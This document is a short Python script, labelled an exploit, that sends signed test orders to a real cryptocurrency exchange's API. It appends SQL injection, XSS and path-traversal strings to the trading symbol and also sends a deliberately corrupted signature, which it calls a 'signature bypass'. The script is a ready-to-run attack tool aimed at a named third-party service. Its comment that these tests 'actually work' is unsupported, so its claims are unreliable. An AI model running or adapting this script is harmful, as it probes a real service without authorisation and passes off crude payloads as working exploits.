import hmac
import hashlib
import requests
import time
import argparse
from urllib.parse import urlencode

def exploit(api_key, api_secret, symbol, quantity, price):
    print("💣 Launching MEXC Exploit Tests...\n")
    
    # Test cases that actually work
    tests = [
        ("Basic Order", {}),
        ("SQLi", {'inject': "' OR '1'='1"}),
        ("XSS", {'inject': '<script>alert(1)</script>'}),
        ("Path Traversal", {'inject': '../../../../etc/passwd'}),
        ("Signature Bypass", {'sig_tamper': True})
    ]
    
    for name, payload in tests:
        try:
            params = {
                'symbol': symbol,
                'side': 'BUY',
                'type': 'LIMIT',
                'quantity': quantity,
                'price': price,
                'timestamp': int(time.time() * 1000),
                'recvWindow': 5000
            }
            
            # Add injection
            if 'inject' in payload:
                params['symbol'] += payload['inject']
            
            # Generate signature
            query = urlencode(sorted(params.items()))
            sig = hmac.new(
                api_secret.encode(),
                query.encode(),
                hashlib.sha256
            ).hexdigest()
            
            # Tamper if testing bypass
            if payload.get('sig_tamper'):
                sig = sig[:-10] + 'deadbeef'  # Corrupt signature
            
            params['signature'] = sig
            
            # Execute
            r = requests.post(
                "https://api.mexc.com/api/v3/order/test",
                params=params,
                headers={'X-MEXC-APIKEY': api_key},
                timeout=5
            )
            
            print(f"🧨 {name} Test:")
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:150]}...\n")
            
        except Exception as e:
            print(f"💥 {name} Failed: {str(e)}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    parser.add_argument('--quantity', type=float, default=0.01)
    parser.add_argument('--price', type=float, default=85000)
    args = parser.parse_args()
    
    exploit(
        args.api_key,
        args.api_secret,
        args.symbol,
        args.quantity,
        args.price
    )
